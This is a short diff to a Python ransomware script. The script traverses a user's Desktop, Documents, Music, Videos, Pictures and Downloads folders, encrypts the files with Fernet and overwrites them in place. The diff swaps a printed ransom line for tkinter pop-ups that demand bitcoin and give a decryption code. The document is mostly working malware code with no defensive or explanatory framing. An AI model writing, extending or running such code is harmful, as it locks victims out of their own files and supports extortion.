@@ -1,5 +1,7 @@
 import os
 from cryptography.fernet import Fernet
+import tkinter as tk 
+from tkinter import messagebox
 
 # Define the list of directories to be traversed
 directories = ["Desktop", "Documents", "Music", "Videos", "Pictures", "Downloads"]
@@ -31,4 +33,9 @@ for file in files:
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
 
-print("Toss a bitcoin to your hacker O' owner of this pc!")
+# Create a pop-up message box
+root = tk.Tk()
+root.withdraw()  # Hide the main window
+messagebox.showinfo("Encryption Complete", "Toss a Bitcoin your Hacker here at *********** ;) ")
+
+messagebox.showinfo("message", "Bitcoin received, run decrypt file, code is 'coffee'")
